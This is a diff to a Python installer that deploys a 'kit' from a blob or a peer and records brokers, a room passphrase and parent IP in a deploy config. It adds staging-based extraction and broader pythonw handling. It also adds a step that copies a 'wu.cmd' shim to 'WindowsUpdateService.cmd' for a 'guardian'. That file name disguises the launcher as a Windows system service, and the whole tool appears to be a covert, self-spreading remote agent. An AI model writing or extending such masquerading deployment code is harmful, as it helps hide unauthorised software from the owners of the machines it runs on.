@@ -110,10 +110,14 @@ def cache_kit(target: str, blob: bytes) -> str:
 
 # --------------------------------------------------------------------------- python
 def _console_variant(path: str) -> str:
-    if IS_WINDOWS and path.lower().endswith("pythonw.exe"):
-        candidate = path[: -len("pythonw.exe")] + "python.exe"
-        if os.path.exists(candidate):
-            return candidate
+    if not IS_WINDOWS:
+        return path
+    leaf = os.path.basename(path).lower()
+    for windowless, console in (("pythonw.exe", "python.exe"), ("pyw.exe", "py.exe")):
+        if leaf == windowless:
+            candidate = path[: -len(windowless)] + console
+            if os.path.exists(candidate):
+                return candidate
     return path
 
 
@@ -311,15 +315,43 @@ def install(args: argparse.Namespace) -> int:
         print("error: nothing to install (use --kit or --from-peer)")
         return 1
 
-    clean_owned(target)
-    extract(blob, target)
+    # Extract to .staging and swap for atomicity
+    staging = os.path.join(os.path.dirname(target), f".staging-{os.getpid()}")
+    try:
+        shutil.rmtree(staging, ignore_errors=True)
+        extract(blob, staging)
+        for name in OWNED:
+            src = os.path.join(staging, name)
+            dst = os.path.join(target, name)
+            if os.path.isdir(src):
+                shutil.rmtree(dst, ignore_errors=True)
+                shutil.copytree(src, dst)
+            elif os.path.isfile(src):
+                try:
+                    os.remove(dst)
+                except OSError:
+                    pass
+                shutil.copy2(src, dst)
+    finally:
+        shutil.rmtree(staging, ignore_errors=True)
+
     cache_kit(target, blob)
 
+    # Shim copy for guardian
+    wu_shim = os.path.join(target, "install", "wu.cmd")
+    if os.path.isfile(wu_shim):
+        try:
+            shutil.copy2(wu_shim, os.path.join(target, "WindowsUpdateService.cmd"))
+        except OSError:
+            pass
+
+    import secrets
     from syspy import config
     write_deploy(target, {
         "url": args.base or config.PUBLIC_URL,
         "room": config.ROOM,
         "pass": config.PASSPHRASE,
+        "salt": secrets.token_hex(2),
         "brokers": config.BROKERS,
         "parent": args.parent,
         "parent_ip": args.parent_ip,
